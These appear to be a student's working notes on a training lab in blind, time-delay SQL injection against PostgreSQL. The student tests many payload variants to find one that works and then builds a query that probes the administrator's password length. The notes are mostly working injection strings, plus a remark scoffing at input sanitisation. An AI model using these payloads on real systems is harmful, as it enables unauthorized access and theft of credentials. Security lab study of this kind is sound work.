# The Lab
# Goal: Log in as Admin

# Preliminary Work
- Given: no different responses for errors or no rows or custom welcome messages returned
    - thus, conditional error payloads are not applicable
- Do conditional payloads with time delays

# Conditional Time Delay Exploitation
- Testing version of SQL with unconditional time delays
    - PostgreSQL: fake'||pg_sleep(10)-- (:white_check_mark:)
- Testing conditional time delays
    - PostgreSQL: fake'||SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        - Loads normally? (:white_check_mark:)
    - Delays?
        - fake'||SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'||SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake'+SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:x:)
        - fake';SELECT+CASE+WHEN+(1=1)+THEN+ pg_sleep(10)+ELSE+pg_sleep(0)+END# (:x:)
        - Looked at solution
            - Completely forgot about URL encoding lol
                - Imagine people actually santizing input lol
            - fake'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END-- (:white_check_mark:)
                - %3B = semicolon
                - Had good idea with plus signs
- Using conditional time delays to extract password characters

# Extracting Information
- Trying: fake'%3BIF+(SELECT+COUNT(username)+FROM+users+WHERE+username+=+'administrator'+AND+SUBSTRING(password,1,1)+>+'m')+=+1+THEN+pg_sleep(10)+ELSE+pg_sleep(0)-- (:x:)
    - Testing to see if the expression is true? (evaluates to 1) <-- PLEASE INVESTIGATE
    - Reminders:
        - Indexing begins from 1
        - First # is index
        - Second # is number of characters after first index to include
- Subsequent Attempts:
    - Replacing %3B with ||
    - Removing plus signs
    - Did not try changing comment characters cuz fake'||pg_sleep(10)-- works
- Looked at solution -> need to change syntax drastically lol
    - Put 'FROM users' at end of statement before comments
    - Replace 'SELECT COUNT' with 'SELECT CASE WHEN'
    - They use 'LENGTH(password)' to get length before spamming with guesses
        - Better strat than mine lol
    - Put 'END' when done with if statement
    - Removed '= 1' at end of if statment condition
    - Removed IF statement entirely
        - Using SELECT CASE WHEN
- Reformulating...
- New payload attempt: fake'%3BSELECT+CASE+WHEN+(username+=+'administrator'+AND+LENGTH(password)+>+1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- (:white_check_mark)
    - IT WORKS!!! -> need to continue testing for length


# Observations
- '||' concantenation works for unconditional time delays ONLY
- Might try the URL encoded semicolon on previous labs that I could not solve
- Stop trying to copy paste syntax from lessons
    - Figure out what you want to do and look up proper SQL syntax
    - Still learn strats from lessons, but apply syntax from own research
    - SQL cheat sheet might not be as helpful as it sounds
- Getting 504 Response = Timeout -> try opening new lab
